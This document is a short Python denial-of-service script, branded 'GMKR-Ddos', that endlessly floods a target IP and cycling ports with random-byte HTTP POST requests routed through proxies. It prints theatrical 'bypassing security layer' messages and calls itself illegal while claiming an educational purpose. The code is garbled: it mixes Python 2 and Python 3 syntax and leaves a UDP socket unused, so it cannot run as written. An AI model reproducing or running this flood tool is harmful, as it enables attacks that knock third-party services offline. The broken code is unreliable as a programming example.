print ("\033[92m")
import sys
import os
import time
import socket
import random
import requests
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet GMKR-Ddos")
print
print "Coded By : GAMKERS"
print "Author   : GAMKERS"
print "Github   : github.com/gamkers"
print "Note- This Tool An Illegal Tool & It's Only For Educational Purpose.. Use It At Your Own Risk,We aren't responsible for your actions"
print
ip = raw_input("IP Target : ")
port = input("Port       : ")

# Lista de proxies (adicionar mais proxies conforme necessário)
proxy_list = [
    'http://username:password@proxy_ip1:proxy_port',
    'http://username:password@proxy_ip2:proxy_port',
    # Adicionar mais proxies conforme necessário
]

os.system("clear")
os.system("figlet GMKR-Ddos")
print("Team : GAMKERS")
print ("\033[92m")
print "________________TRYING TO REACH THE SERVER_____________________"
time.sleep(5)
print "_________________ESTABLISHING CONNECTION_______________________"
time.sleep(5)
print "_________0100100 BYPASSING SECURITY LAYER 001010_______________"
time.sleep(5)
print "_________________CONNECTION ESTABLISHED________________________"
time.sleep(5)
print "    DDOS ATTACK STARTED. NOTE: ONLY FOR EDUCATIONAL PURPOSES"
time.sleep(3)
sent = 0

# Função para obter um proxy da lista de proxies
def get_proxy():
    return random.choice(proxy_list)

while True:
    try:
        proxy = get_proxy()
        proxies = {
            'http': proxy,
            'https': proxy
        }
        requests.post(f'http://{ip}:{port}', headers={'Connection':'close'}, data=bytes, proxies=proxies, timeout=1)
        sent += 1
        print(f"Sent {sent} packet to {ip} throught port: {port} via proxy: {proxy}")
        port += 1
        if port == 65534:
            port = 1
    except Exception as e:
        print("Error:", e)
